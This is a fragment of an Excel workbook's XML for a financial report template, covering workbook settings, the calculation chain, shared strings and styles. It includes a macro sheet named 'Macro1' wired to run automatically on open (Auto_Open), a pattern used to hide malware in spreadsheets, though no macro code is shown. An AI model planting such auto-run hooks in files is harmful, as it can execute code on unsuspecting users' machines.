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macrosheets/sheet1.xml" ContentType="application/vnd.ms-excel.macro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workbookPr codeName="ThisWorkbook"/>
  <mc:AlternateContent xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006">
    <mc:Choice Requires="x15">
      <x15ac:absPath xmlns:x15ac="http://schemas.microsoft.com/office/spreadsheetml/2010/11/ac" url="C:\Users\dev\Desktop\"/>
    </mc:Choice>
  </mc:AlternateContent>
  <xr:revisionPtr revIDLastSave="0" documentId="8_{1A2A9F01-014B-4BBF-8795-F8AA2E948C52}" xr6:coauthVersionLast="45" xr6:coauthVersionMax="45" xr10:uidLastSave="{00000000-0000-0000-0000-000000000000}"/>
  <bookViews>
    <workbookView xWindow="-98" yWindow="-98" windowWidth="15556" windowHeight="11266" xr2:uid="{00000000-000D-0000-FFFF-FFFF00000000}"/>
  </bookViews>
  <sheets>
    <sheet name="Financial Report" sheetId="3" r:id="rId1"/>
    <sheet name="Financial Data Input" sheetId="1" r:id="rId2"/>
    <sheet name="Macro1" sheetId="5" r:id="rId3"/>
    <sheet name="Key Metric Settings" sheetId="4" r:id="rId4"/>
    <sheet name="Calculations" sheetId="2" state="hidden" r:id="rId5"/>
  </sheets>
  <definedNames>
    <definedName name="_xlnm.Auto_Open">Macro1!$A$1</definedName>
    <definedName name="lstMetrics">OFFSET('Financial Data Input'!$B$6:$B$30,0,0,COUNTA('Financial Data Input'!$B$6:$B$30))</definedName>
    <definedName name="lstYears">OFFSET('Financial Data Input'!$B$5:$I$5,0,1,1,COUNTA('Financial Data Input'!$B$5:$I$5)-1)</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="0">'Financial Report'!$A$1:$M$40</definedName>
    <definedName name="SelectedYear">'Financial Report'!$K$2</definedName>
    <definedName name="Years">Calculations!$I$6</definedName>
  </definedNames>
  <calcPr calcId="191029"/>
</workbook>
</file>

<file path=xl/calcChain.xml><?xml version="1.0" encoding="utf-8"?>
<calcChain xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <c r="D5" i="1" l="1"/>
  <c r="C5" i="1" l="1"/>
  <c r="E5" i="1"/>
  <c r="F5" i="1"/>
  <c r="G5" i="1"/>
  <c r="H5" i="1"/>
  <c r="I5" i="1"/>
  <c r="E15" i="3" l="1"/>
  <c r="D15" i="3"/>
  <c r="B39" i="2" l="1"/>
  <c r="A32" i="2"/>
  <c r="A33" i="2"/>
  <c r="A34" i="2"/>
  <c r="A35" i="2"/>
  <c r="A36" i="2"/>
  <c r="A37" i="2"/>
  <c r="A38" i="2"/>
  <c r="A39" i="2"/>
  <c r="B15" i="2"/>
  <c r="B16" i="2"/>
  <c r="B17" i="2"/>
  <c r="B18" i="3" s="1"/>
  <c r="B18" i="2"/>
  <c r="B19" i="2"/>
  <c r="B20" i="2"/>
  <c r="B21" i="2"/>
  <c r="B22" i="2"/>
  <c r="B23" i="2"/>
  <c r="B24" i="2"/>
  <c r="B25" i="2"/>
  <c r="B26" i="3" s="1"/>
  <c r="B26" i="2"/>
  <c r="B27" i="2"/>
  <c r="B28" i="2"/>
  <c r="B29" i="2"/>
  <c r="A29" i="2"/>
  <c r="B9" i="2"/>
  <c r="A9" i="2" s="1"/>
  <c r="B10" i="2"/>
  <c r="A10" i="2" s="1"/>
  <c r="B11" i="2"/>
  <c r="A11" i="2" s="1"/>
  <c r="B12" i="2"/>
  <c r="A12" i="2" s="1"/>
  <c r="B8" i="2"/>
  <c r="A8" i="2" s="1"/>
  <c r="B17" i="3"/>
  <c r="B19" i="3"/>
  <c r="B21" i="3"/>
  <c r="B23" i="3"/>
  <c r="B25" i="3"/>
  <c r="B27" i="3"/>
  <c r="B29" i="3"/>
  <c r="B30" i="2"/>
  <c r="B31" i="3" s="1"/>
  <c r="E31" i="3" s="1"/>
  <c r="B31" i="2"/>
  <c r="B32" i="3" s="1"/>
  <c r="E32" i="3" s="1"/>
  <c r="B32" i="2"/>
  <c r="B33" i="3" s="1"/>
  <c r="E33" i="3" s="1"/>
  <c r="B33" i="2"/>
  <c r="B34" i="3" s="1"/>
  <c r="E34" i="3" s="1"/>
  <c r="B34" i="2"/>
  <c r="B35" i="2"/>
  <c r="B36" i="2"/>
  <c r="B37" i="3" s="1"/>
  <c r="E37" i="3" s="1"/>
  <c r="B37" i="2"/>
  <c r="B38" i="3" s="1"/>
  <c r="E38" i="3" s="1"/>
  <c r="B38" i="2"/>
  <c r="B39" i="3" s="1"/>
  <c r="E39" i="3" s="1"/>
  <c r="B40" i="3"/>
  <c r="E40" i="3" s="1"/>
  <c r="B16" i="3"/>
  <c r="B36" i="3"/>
  <c r="E36" i="3" s="1"/>
  <c r="B20" i="3"/>
  <c r="B22" i="3"/>
  <c r="B24" i="3"/>
  <c r="B28" i="3"/>
  <c r="B30" i="3"/>
  <c r="E30" i="3" s="1"/>
  <c r="A16" i="2"/>
  <c r="A17" i="2"/>
  <c r="A18" i="2"/>
  <c r="A19" i="2"/>
  <c r="A20" i="2"/>
  <c r="A21" i="2"/>
  <c r="A22" i="2"/>
  <c r="A23" i="2"/>
  <c r="A24" i="2"/>
  <c r="A25" i="2"/>
  <c r="A26" i="2"/>
  <c r="A27" i="2"/>
  <c r="A28" i="2"/>
  <c r="A30" i="2"/>
  <c r="A31" i="2"/>
  <c r="A15" i="2"/>
  <c r="C3" i="2"/>
  <c r="C4" i="2" s="1"/>
  <c r="D4" i="2" s="1"/>
  <c r="D38" i="2"/>
  <c r="E38" i="2"/>
  <c r="F7" i="3"/>
  <c r="B35" i="3"/>
  <c r="E35" i="3" s="1"/>
  <c r="B7" i="3"/>
  <c r="D6" i="4"/>
  <c r="D7" i="4"/>
  <c r="D8" i="4"/>
  <c r="D9" i="4"/>
  <c r="D5" i="4"/>
  <c r="H7" i="3" l="1"/>
  <c r="D7" i="3"/>
  <c r="J7" i="3"/>
  <c r="D3" i="2"/>
  <c r="G7" i="2"/>
  <c r="F36" i="2"/>
  <c r="G32" i="2"/>
  <c r="D33" i="3" s="1"/>
  <c r="D36" i="2"/>
  <c r="E37" i="2"/>
  <c r="C36" i="2"/>
  <c r="D34" i="2"/>
  <c r="D31" i="2"/>
  <c r="D32" i="2"/>
  <c r="D30" i="2"/>
  <c r="D37" i="2"/>
  <c r="G33" i="2"/>
  <c r="D34" i="3" s="1"/>
  <c r="E36" i="2"/>
  <c r="D33" i="2"/>
  <c r="C30" i="2"/>
  <c r="C32" i="2"/>
  <c r="C33" i="2"/>
  <c r="E30" i="2"/>
  <c r="C34" i="2"/>
  <c r="E34" i="2"/>
  <c r="C35" i="2"/>
  <c r="E32" i="2"/>
  <c r="C38" i="2"/>
  <c r="G30" i="2"/>
  <c r="D31" i="3" s="1"/>
  <c r="F30" i="2"/>
  <c r="G34" i="2"/>
  <c r="D35" i="3" s="1"/>
  <c r="F34" i="2"/>
  <c r="E31" i="2"/>
  <c r="F35" i="2"/>
  <c r="F32" i="2"/>
  <c r="G36" i="2"/>
  <c r="D37" i="3" s="1"/>
  <c r="G37" i="2"/>
  <c r="D38" i="3" s="1"/>
  <c r="G38" i="2"/>
  <c r="D39" i="3" s="1"/>
  <c r="F38" i="2"/>
  <c r="G35" i="2"/>
  <c r="D36" i="3" s="1"/>
  <c r="G31" i="2"/>
  <c r="D32" i="3" s="1"/>
  <c r="F29" i="2"/>
  <c r="E29" i="2"/>
  <c r="G29" i="2"/>
  <c r="D30" i="3" s="1"/>
  <c r="C29" i="2"/>
  <c r="D29" i="2"/>
  <c r="F33" i="2"/>
  <c r="E33" i="2"/>
  <c r="F31" i="2"/>
  <c r="C31" i="2"/>
  <c r="E35" i="2"/>
  <c r="D35" i="2"/>
  <c r="F37" i="2"/>
  <c r="C37" i="2"/>
  <c r="G39" i="2"/>
  <c r="D40" i="3" s="1"/>
  <c r="C39" i="2"/>
  <c r="F39" i="2"/>
  <c r="D39" i="2"/>
  <c r="E39" i="2"/>
  <c r="H33" i="3" l="1"/>
  <c r="G6" i="2"/>
  <c r="F7" i="2"/>
  <c r="H36" i="3"/>
  <c r="H39" i="3"/>
  <c r="H32" i="3"/>
  <c r="H30" i="3"/>
  <c r="H37" i="3"/>
  <c r="H35" i="3"/>
  <c r="H31" i="3"/>
  <c r="H34" i="3"/>
  <c r="H38" i="3"/>
  <c r="H40" i="3"/>
  <c r="F6" i="2" l="1"/>
  <c r="E7" i="2"/>
  <c r="G10" i="2"/>
  <c r="G9" i="2"/>
  <c r="G16" i="2"/>
  <c r="D17" i="3" s="1"/>
  <c r="G17" i="2"/>
  <c r="D18" i="3" s="1"/>
  <c r="G22" i="2"/>
  <c r="D23" i="3" s="1"/>
  <c r="G26" i="2"/>
  <c r="D27" i="3" s="1"/>
  <c r="G23" i="2"/>
  <c r="D24" i="3" s="1"/>
  <c r="G20" i="2"/>
  <c r="D21" i="3" s="1"/>
  <c r="G15" i="2"/>
  <c r="D16" i="3" s="1"/>
  <c r="G12" i="2"/>
  <c r="G11" i="2"/>
  <c r="G8" i="2"/>
  <c r="G25" i="2"/>
  <c r="D26" i="3" s="1"/>
  <c r="G21" i="2"/>
  <c r="D22" i="3" s="1"/>
  <c r="G18" i="2"/>
  <c r="D19" i="3" s="1"/>
  <c r="G27" i="2"/>
  <c r="D28" i="3" s="1"/>
  <c r="G19" i="2"/>
  <c r="D20" i="3" s="1"/>
  <c r="G24" i="2"/>
  <c r="D25" i="3" s="1"/>
  <c r="G28" i="2"/>
  <c r="D29" i="3" s="1"/>
  <c r="B8" i="3" l="1"/>
  <c r="J8" i="3"/>
  <c r="D8" i="3"/>
  <c r="E6" i="2"/>
  <c r="D7" i="2"/>
  <c r="H8" i="3"/>
  <c r="F8" i="3"/>
  <c r="F9" i="2"/>
  <c r="H9" i="2" s="1"/>
  <c r="D9" i="3" s="1"/>
  <c r="F10" i="2"/>
  <c r="H10" i="2" s="1"/>
  <c r="F9" i="3" s="1"/>
  <c r="F15" i="2"/>
  <c r="E16" i="3" s="1"/>
  <c r="H16" i="3" s="1"/>
  <c r="F27" i="2"/>
  <c r="F23" i="2"/>
  <c r="F19" i="2"/>
  <c r="F28" i="2"/>
  <c r="F20" i="2"/>
  <c r="F11" i="2"/>
  <c r="H11" i="2" s="1"/>
  <c r="H9" i="3" s="1"/>
  <c r="F12" i="2"/>
  <c r="H12" i="2" s="1"/>
  <c r="J9" i="3" s="1"/>
  <c r="F8" i="2"/>
  <c r="H8" i="2" s="1"/>
  <c r="B9" i="3" s="1"/>
  <c r="F25" i="2"/>
  <c r="F21" i="2"/>
  <c r="F17" i="2"/>
  <c r="F26" i="2"/>
  <c r="F22" i="2"/>
  <c r="F18" i="2"/>
  <c r="F24" i="2"/>
  <c r="F16" i="2"/>
  <c r="E25" i="3" l="1"/>
  <c r="H25" i="3" s="1"/>
  <c r="E23" i="3"/>
  <c r="H23" i="3" s="1"/>
  <c r="E18" i="3"/>
  <c r="H18" i="3" s="1"/>
  <c r="E26" i="3"/>
  <c r="H26" i="3" s="1"/>
  <c r="E21" i="3"/>
  <c r="H21" i="3" s="1"/>
  <c r="E20" i="3"/>
  <c r="H20" i="3" s="1"/>
  <c r="E28" i="3"/>
  <c r="H28" i="3" s="1"/>
  <c r="E17" i="3"/>
  <c r="H17" i="3" s="1"/>
  <c r="E19" i="3"/>
  <c r="H19" i="3" s="1"/>
  <c r="E27" i="3"/>
  <c r="H27" i="3" s="1"/>
  <c r="E22" i="3"/>
  <c r="H22" i="3" s="1"/>
  <c r="E29" i="3"/>
  <c r="H29" i="3" s="1"/>
  <c r="E24" i="3"/>
  <c r="H24" i="3" s="1"/>
  <c r="D6" i="2"/>
  <c r="C7" i="2"/>
  <c r="C6" i="2" s="1"/>
  <c r="E10" i="2"/>
  <c r="E9" i="2"/>
  <c r="E16" i="2"/>
  <c r="E15" i="2"/>
  <c r="E22" i="2"/>
  <c r="E21" i="2"/>
  <c r="E18" i="2"/>
  <c r="E27" i="2"/>
  <c r="E19" i="2"/>
  <c r="E24" i="2"/>
  <c r="E12" i="2"/>
  <c r="E11" i="2"/>
  <c r="E8" i="2"/>
  <c r="E17" i="2"/>
  <c r="E25" i="2"/>
  <c r="E26" i="2"/>
  <c r="E23" i="2"/>
  <c r="E28" i="2"/>
  <c r="E20" i="2"/>
  <c r="I6" i="2" l="1"/>
  <c r="I15" i="3" s="1"/>
  <c r="C10" i="2"/>
  <c r="C9" i="2"/>
  <c r="C16" i="2"/>
  <c r="C18" i="2"/>
  <c r="C17" i="2"/>
  <c r="C15" i="2"/>
  <c r="C27" i="2"/>
  <c r="C19" i="2"/>
  <c r="C24" i="2"/>
  <c r="C12" i="2"/>
  <c r="C11" i="2"/>
  <c r="C8" i="2"/>
  <c r="C26" i="2"/>
  <c r="C21" i="2"/>
  <c r="C25" i="2"/>
  <c r="C22" i="2"/>
  <c r="C23" i="2"/>
  <c r="C28" i="2"/>
  <c r="C20" i="2"/>
  <c r="D9" i="2"/>
  <c r="D10" i="2"/>
  <c r="D16" i="2"/>
  <c r="D22" i="2"/>
  <c r="D15" i="2"/>
  <c r="D26" i="2"/>
  <c r="D27" i="2"/>
  <c r="D19" i="2"/>
  <c r="D24" i="2"/>
  <c r="D11" i="2"/>
  <c r="D12" i="2"/>
  <c r="D8" i="2"/>
  <c r="D25" i="2"/>
  <c r="D17" i="2"/>
  <c r="D21" i="2"/>
  <c r="D18" i="2"/>
  <c r="D23" i="2"/>
  <c r="D28" i="2"/>
  <c r="D20" i="2"/>
</calcChain>
</file>

<file path=xl/sharedStrings.xml><?xml version="1.0" encoding="utf-8"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="45" uniqueCount="38">
  <si>
    <t>ANNUAL FINANCIAL REPORT</t>
  </si>
  <si>
    <t>KEY METRICS</t>
  </si>
  <si>
    <t>ALL METRICS</t>
  </si>
  <si>
    <t>METRIC</t>
  </si>
  <si>
    <t>% CHANGE</t>
  </si>
  <si>
    <t>INPUT YOUR FINANCIAL DATA</t>
  </si>
  <si>
    <t>METRIC NAME</t>
  </si>
  <si>
    <t>REVENUES</t>
  </si>
  <si>
    <t>OPERATING EXPENSES</t>
  </si>
  <si>
    <t>OPERATING PROFIT</t>
  </si>
  <si>
    <t>DEPRECIATION</t>
  </si>
  <si>
    <t>INTEREST</t>
  </si>
  <si>
    <t>NET PROFIT</t>
  </si>
  <si>
    <t>TAX</t>
  </si>
  <si>
    <t>PROFIT AFTER TAX</t>
  </si>
  <si>
    <t>METRIC 1</t>
  </si>
  <si>
    <t>METRIC 2</t>
  </si>
  <si>
    <t>METRIC 3</t>
  </si>
  <si>
    <t>METRIC 4</t>
  </si>
  <si>
    <t>METRIC 5</t>
  </si>
  <si>
    <t>METRIC 6</t>
  </si>
  <si>
    <t>DEFINE KEY METRICS HERE</t>
  </si>
  <si>
    <t xml:space="preserve"> SELECT UP TO 5 KEY METRICS TO SHOW AT THE TOP OF THE REPORT</t>
  </si>
  <si>
    <t>This worksheet is used for the Financial Report calculations and should remain hidden.</t>
  </si>
  <si>
    <t>Position</t>
  </si>
  <si>
    <t>This year</t>
  </si>
  <si>
    <t>Previous Year</t>
  </si>
  <si>
    <t>Key Metrics</t>
  </si>
  <si>
    <t>All Metrics (works up to 25 metrics)</t>
  </si>
  <si>
    <t xml:space="preserve"> YOU CAN DEFINE UP TO 25 KEY METRICS FOR 7 YEARS</t>
  </si>
  <si>
    <t>To edit data, select the Financial Data Input sheet</t>
  </si>
  <si>
    <t>Do not modify the information below. Tap to enter Financial Data</t>
  </si>
  <si>
    <t>Tap to change report Key Metrics</t>
  </si>
  <si>
    <t>Tap to view Financial Report</t>
  </si>
  <si>
    <t xml:space="preserve">  Tap to view Financial Report</t>
  </si>
  <si>
    <t>Select report year in Cell L2</t>
  </si>
  <si>
    <t>Tattoine Ltd</t>
  </si>
  <si>
    <t>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</si>
</sst>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5" formatCode="&quot;$&quot;#,##0_);\(&quot;$&quot;#,##0\)"/>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quot;$&quot;#,##0.00"/>
  </numFmts>
  <fonts count="17" x14ac:knownFonts="1">
    <font>
      <sz val="11"/>
      <color theme="1" tint="0.34998626667073579"/>
      <name val="Trebuchet MS"/>
      <family val="2"/>
      <scheme val="major"/>
    </font>
    <font>
      <b/>
      <sz val="11"/>
      <color theme="1"/>
      <name val="Arial"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <sz val="11"/>
      <color theme="1" tint="0.499984740745262"/>
      <name val="Arial"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <sz val="11"/>
      <color theme="1"/>
      <name val="Arial"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <b/>
      <sz val="11"/>
      <color theme="0"/>
      <name val="Arial"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <sz val="18"/>
      <color theme="1" tint="0.34998626667073579"/>
      <name val="Arial"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <sz val="11"/>
      <color theme="4" tint="-0.249977111117893"/>
      <name val="Arial"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <sz val="11"/>
      <color theme="1" tint="0.34998626667073579"/>
      <name val="Trebuchet MS"/>
      <family val="2"/>
      <scheme val="major"/>
    </font>
    <font>
      <sz val="12"/>
      <color theme="1" tint="0.34998626667073579"/>
      <name val="Arial"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <sz val="20"/>
      <color theme="1" tint="0.34998626667073579"/>
      <name val="Arial"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <i/>
      <u/>
      <sz val="11"/>
      <color theme="4" tint="-0.499984740745262"/>
      <name val="Arial"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <i/>
      <sz val="11"/>
      <color theme="4" tint="-0.499984740745262"/>
      <name val="Arial"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <sz val="14"/>
      <color theme="1" tint="0.34998626667073579"/>
      <name val="Trebuchet MS"/>
      <family val="2"/>
      <scheme val="major"/>
    </font>
    <font>
      <sz val="14"/>
      <color theme="3" tint="0.34998626667073579"/>
      <name val="Arial"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <sz val="24"/>
      <color theme="4" tint="-0.499984740745262"/>
      <name val="Trebuchet MS"/>
      <family val="2"/>
      <scheme val="major"/>
    </font>
    <font>
      <sz val="20"/>
      <color theme="1" tint="0.34998626667073579"/>
      <name val="Trebuchet MS"/>
      <family val="2"/>
      <scheme val="major"/>
    </font>
    <font>
      <sz val="11"/>
      <color theme="1" tint="0.34998626667073579"/>
      <name val="Arial"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
  </fonts>
  <fills count="4">
    <fill>
      <patternFill patternType="none"/>
    </fill>
    <fill>
      <patternFill patternType="gray125"/>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor rgb="FFFFFFCC"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor theme="4" tint="-0.499984740745262"/>
        <bgColor indexed="64"/>
      </patternFill>
    </fill>
  </fills>
  <borders count="43">
    <border>
      <left/>
      <right/>
      <top/>
      <bottom/>
      <diagonal/>
    </border>
    <border>
      <left style="medium">
        <color theme="1" tint="0.34998626667073579"/>
      </left>
      <right/>
      <top/>
      <bottom/>
      <diagonal/>
    </border>
    <border>
      <left/>
      <right style="medium">
        <color theme="1" tint="0.34998626667073579"/>
      </right>
      <top/>
      <bottom/>
      <diagonal/>
    </border>
    <border>
      <left style="medium">
        <color theme="1" tint="0.34998626667073579"/>
      </left>
      <right/>
      <top/>
      <bottom style="medium">
        <color theme="1" tint="0.34998626667073579"/>
      </bottom>
      <diagonal/>
    </border>
    <border>
      <left/>
      <right style="medium">
        <color theme="1" tint="0.34998626667073579"/>
      </right>
      <top/>
      <bottom style="medium">
        <color theme="1" tint="0.34998626667073579"/>
      </bottom>
      <diagonal/>
    </border>
    <border>
      <left/>
      <right/>
      <top/>
      <bottom style="dashed">
        <color theme="1" tint="0.34998626667073579"/>
      </bottom>
      <diagonal/>
    </border>
    <border>
      <left style="medium">
        <color theme="1" tint="0.34998626667073579"/>
      </left>
      <right style="medium">
        <color theme="1" tint="0.34998626667073579"/>
      </right>
      <top/>
      <bottom/>
      <diagonal/>
    </border>
    <border>
      <left/>
      <right/>
      <top/>
      <bottom style="medium">
        <color theme="1" tint="0.34998626667073579"/>
      </bottom>
      <diagonal/>
    </border>
    <border>
      <left style="medium">
        <color theme="1" tint="0.34998626667073579"/>
      </left>
      <right/>
      <top style="dashed">
        <color theme="1" tint="0.34998626667073579"/>
      </top>
      <bottom/>
      <diagonal/>
    </border>
    <border>
      <left/>
      <right style="medium">
        <color theme="1" tint="0.34998626667073579"/>
      </right>
      <top style="dashed">
        <color theme="1" tint="0.34998626667073579"/>
      </top>
      <bottom/>
      <diagonal/>
    </border>
    <border>
      <left/>
      <right/>
      <top style="dashed">
        <color theme="1" tint="0.34998626667073579"/>
      </top>
      <bottom/>
      <diagonal/>
    </border>
    <border>
      <left/>
      <right/>
      <top style="thin">
        <color theme="0" tint="-0.14993743705557422"/>
      </top>
      <bottom style="thin">
        <color theme="0" tint="-0.14993743705557422"/>
      </bottom>
      <diagonal/>
    </border>
    <border>
      <left/>
      <right/>
      <top style="thin">
        <color theme="0" tint="-0.14996795556505021"/>
      </top>
      <bottom/>
      <diagonal/>
    </border>
    <border>
      <left/>
      <right/>
      <top/>
      <bottom style="thin">
        <color theme="0" tint="-0.14993743705557422"/>
      </bottom>
      <diagonal/>
    </border>
    <border>
      <left/>
      <right/>
      <top style="medium">
        <color theme="0" tint="-0.34998626667073579"/>
      </top>
      <bottom/>
      <diagonal/>
    </border>
    <border>
      <left style="medium">
        <color theme="1" tint="0.34998626667073579"/>
      </left>
      <right style="medium">
        <color theme="1" tint="0.34998626667073579"/>
      </right>
      <top style="dashed">
        <color theme="1" tint="0.34998626667073579"/>
      </top>
      <bottom/>
      <diagonal/>
    </border>
    <border>
      <left style="medium">
        <color theme="1" tint="0.34998626667073579"/>
      </left>
      <right style="medium">
        <color theme="1" tint="0.34998626667073579"/>
      </right>
      <top/>
      <bottom style="medium">
        <color theme="1" tint="0.34998626667073579"/>
      </bottom>
      <diagonal/>
    </border>
    <border>
      <left style="medium">
        <color theme="1" tint="0.34998626667073579"/>
      </left>
      <right style="medium">
        <color theme="1" tint="0.34998626667073579"/>
      </right>
      <top/>
      <bottom style="dashed">
        <color theme="1" tint="0.34998626667073579"/>
      </bottom>
      <diagonal/>
    </border>
    <border>
      <left style="medium">
        <color theme="1" tint="0.34998626667073579"/>
      </left>
      <right/>
      <top/>
      <bottom style="dashed">
        <color theme="1" tint="0.34998626667073579"/>
      </bottom>
      <diagonal/>
    </border>
    <border>
      <left/>
      <right style="medium">
        <color theme="1" tint="0.34998626667073579"/>
      </right>
      <top/>
      <bottom style="dashed">
        <color theme="1" tint="0.34998626667073579"/>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style="medium">
        <color theme="1" tint="0.34998626667073579"/>
      </top>
      <bottom style="medium">
        <color theme="1" tint="0.34998626667073579"/>
      </bottom>
      <diagonal/>
    </border>
    <border>
      <left/>
      <right/>
      <top style="thin">
        <color theme="4" tint="-0.499984740745262"/>
      </top>
      <bottom style="double">
        <color theme="4" tint="-0.499984740745262"/>
      </bottom>
      <diagonal/>
    </border>
    <border>
      <left style="medium">
        <color theme="4" tint="-0.499984740745262"/>
      </left>
      <right style="medium">
        <color theme="4" tint="-0.499984740745262"/>
      </right>
      <top style="medium">
        <color theme="4" tint="-0.499984740745262"/>
      </top>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1" tint="0.34998626667073579"/>
      </left>
      <right style="thin">
        <color theme="1" tint="0.34998626667073579"/>
      </right>
      <top style="medium">
        <color theme="1" tint="0.34998626667073579"/>
      </top>
      <bottom style="thin">
        <color theme="1" tint="0.34998626667073579"/>
      </bottom>
      <diagonal/>
    </border>
    <border>
      <left style="thin">
        <color theme="1" tint="0.34998626667073579"/>
      </left>
      <right style="medium">
        <color theme="1" tint="0.34998626667073579"/>
      </right>
      <top style="medium">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medium">
        <color theme="1" tint="0.34998626667073579"/>
      </right>
      <top style="thin">
        <color theme="1" tint="0.34998626667073579"/>
      </top>
      <bottom style="thin">
        <color theme="1" tint="0.34998626667073579"/>
      </bottom>
      <diagonal/>
    </border>
    <border>
      <left style="medium">
        <color theme="1" tint="0.34998626667073579"/>
      </left>
      <right style="thin">
        <color theme="1" tint="0.34998626667073579"/>
      </right>
      <top style="thin">
        <color theme="1" tint="0.34998626667073579"/>
      </top>
      <bottom style="medium">
        <color theme="1" tint="0.34998626667073579"/>
      </bottom>
      <diagonal/>
    </border>
    <border>
      <left style="thin">
        <color theme="1" tint="0.34998626667073579"/>
      </left>
      <right style="medium">
        <color theme="1" tint="0.34998626667073579"/>
      </right>
      <top style="thin">
        <color theme="1" tint="0.34998626667073579"/>
      </top>
      <bottom style="medium">
        <color theme="1" tint="0.34998626667073579"/>
      </bottom>
      <diagonal/>
    </border>
    <border>
      <left/>
      <right/>
      <top style="thin">
        <color theme="1" tint="0.34998626667073579"/>
      </top>
      <bottom/>
      <diagonal/>
    </border>
    <border>
      <left/>
      <right/>
      <top style="thin">
        <color theme="1" tint="0.34998626667073579"/>
      </top>
      <bottom style="thin">
        <color theme="0" tint="-0.14993743705557422"/>
      </bottom>
      <diagonal/>
    </border>
    <border>
      <left/>
      <right/>
      <top style="thin">
        <color theme="0" tint="-0.14993743705557422"/>
      </top>
      <bottom style="thin">
        <color theme="1" tint="0.34998626667073579"/>
      </bottom>
      <diagonal/>
    </border>
    <border>
      <left/>
      <right/>
      <top style="thin">
        <color theme="0" tint="-0.14996795556505021"/>
      </top>
      <bottom style="thin">
        <color theme="1" tint="0.34998626667073579"/>
      </bottom>
      <diagonal/>
    </border>
    <border>
      <left/>
      <right/>
      <top/>
      <bottom style="thin">
        <color theme="0" tint="-0.14996795556505021"/>
      </bottom>
      <diagonal/>
    </border>
    <border>
      <left/>
      <right/>
      <top/>
      <bottom style="thin">
        <color theme="1" tint="0.34998626667073579"/>
      </bottom>
      <diagonal/>
    </border>
    <border>
      <left/>
      <right/>
      <top style="thin">
        <color theme="0" tint="-0.14996795556505021"/>
      </top>
      <bottom style="thin">
        <color theme="0" tint="-0.14996795556505021"/>
      </bottom>
      <diagonal/>
    </border>
    <border>
      <left/>
      <right/>
      <top style="medium">
        <color theme="1" tint="0.34998626667073579"/>
      </top>
      <bottom style="medium">
        <color theme="4" tint="-0.499984740745262"/>
      </bottom>
      <diagonal/>
    </border>
    <border>
      <left/>
      <right/>
      <top style="medium">
        <color theme="1" tint="0.34998626667073579"/>
      </top>
      <bottom style="thin">
        <color theme="0" tint="-0.14996795556505021"/>
      </bottom>
      <diagonal/>
    </border>
  </borders>
  <cellStyleXfs count="17">
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" applyFill="0" applyBorder="0">
      <alignment vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="9" fontId="3" fillId="0" borderId="0" applyFont="0" applyFill="0" applyBorder="0" applyAlignment="0" applyProtection="0"/>
    <xf numFmtId="0" fontId="14" fillId="0" borderId="0" applyNumberFormat="0" applyFill="0" applyBorder="0" applyAlignment="0" applyProtection="0"/>
    <xf numFmtId="0" fontId="12" fillId="0" borderId="22" applyNumberFormat="0" applyFill="0" applyProtection="0">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="5" fillId="0" borderId="0" applyNumberFormat="0" applyFill="0" applyBorder="0" applyAlignment="0" applyProtection="0"/>
    <xf numFmtId="0" fontId="4" fillId="3" borderId="0">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="5" fontId="9" fillId="0" borderId="5">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="9" fontId="8" fillId="0" borderId="0">
      <alignment horizontal="left" vertical="center" indent="1"/>
    </xf>
    <xf numFmtId="0" fontId="13" fillId="0" borderId="0" applyNumberFormat="0" applyFill="0" applyBorder="0" applyAlignment="0" applyProtection="0"/>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167" fontId="7" fillId="0" borderId="0" applyFill="0" applyBorder="0" applyAlignment="0" applyProtection="0"/>
    <xf numFmtId="165" fontId="7" fillId="0" borderId="0" applyFill="0" applyBorder="0" applyAlignment="0" applyProtection="0"/>
    <xf numFmtId="166" fontId="7" fillId="0" borderId="0" applyFill="0" applyBorder="0" applyAlignment="0" applyProtection="0"/>
    <xf numFmtId="164" fontId="7" fillId="0" borderId="0" applyFill="0" applyBorder="0" applyAlignment="0" applyProtection="0"/>
    <xf numFmtId="0" fontId="7" fillId="2" borderId="21" applyNumberFormat="0" applyAlignment="0" applyProtection="0"/>
    <xf numFmtId="0" fontId="1" fillId="0" borderId="23" applyNumberFormat="0" applyFill="0" applyAlignment="0" applyProtection="0"/>
  </cellStyleXfs>
  <cellXfs count="99">
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0">
      <alignment vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0" applyAlignment="1">
      <alignment horizontal="center"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0" applyAlignment="1">
      <alignment horizontal="right"/>
    </xf>
    <xf numFmtId="9" fontId="0" fillId="0" borderId="0" xfId="1" applyFont="1"/>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indent="1"/>
    </xf>
    <xf numFmtId="0" fontId="12" fillId="0" borderId="22" xfId="3">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="1" fillId="0" borderId="0" xfId="0" applyFont="1" applyAlignment="1"/>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0" applyBorder="1">
      <alignment vertical="center" wrapText="1"/>
    </xf>
